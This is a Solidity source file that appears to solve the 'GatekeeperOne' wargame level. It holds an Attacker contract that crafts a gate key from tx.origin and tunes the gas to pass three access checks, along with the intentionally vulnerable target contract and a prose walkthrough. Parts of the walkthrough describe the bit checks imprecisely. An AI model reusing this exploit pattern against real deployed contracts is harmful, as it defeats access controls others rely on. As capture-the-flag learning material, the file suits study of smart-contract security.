// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Attacker {
    function enter(address _target, uint gas) external {
        IGateKeeperOne target = IGateKeeperOne(_target);

        // k = uint64(_gateKey);

        // uint32(k) == uint16(uint160(tx.origin));
        // uint32(k) == uint16(k);
        uint16 k16 = uint16(uint160(tx.origin));

        // uint32(k) != k;
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64); 

        require(gas < 8191, "gas greater or equal to 8191");
        require(target.enter{gas: 8191 * 10 + gas}(key), "failed");
    }
}

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

/** 
Explanation:

The Attacker contract is created to exploit the GatekeeperOne contract.

The enter function of the Attacker contract is called externally, taking the target contract's address and a 
gas parameter as arguments.

Inside the enter function, the IGateKeeperOne interface is used to interact with the target contract.

The attacker manipulates the _gateKey value to satisfy the gateThree modifier conditions.

The attacker extracts the lower 16 bits of the tx.origin (attacker's address) and assigns it to k16.

The attacker constructs k64 by shifting 1 to the 63rd bit and adding k16.

The k64 is converted into a bytes8 type and assigned to the key variable.

Two require statements are used to validate the gas parameter and the execution of the target.enter 
function with the manipulated key.

If all the requirements are satisfied, the target.enter function is called, passing the manipulated key and 
the adjusted gas value.

The enter function of the GatekeeperOne contract checks several modifiers: gateOne, gateTwo, and gateThree.

The gateOne modifier ensures that the msg.sender is not the original transaction origin (tx.origin).

The gateTwo modifier checks if the remaining gas is divisible by 8191.

The gateThree modifier validates the bytes8 _gateKey argument by performing three checks on it.

Inside the gateThree modifier, the _gateKey is typecast to a `uint64, and its first 32 bits are compared 
to the lower 16 bits of tx.origin`.

The modifier also checks if _gateKey is not equal to its full uint64 value and ensures that its first 32 bits match 
the lower 16 bits of tx.origin.

If all the modifiers pass, the enter function updates the entrant variable with the tx.origin address and returns true.

By manipulating the _gateKey value and satisfying the modifier conditions, the attacker is able to exploit the 
GatekeeperOne contract and update the entrant variable.
 */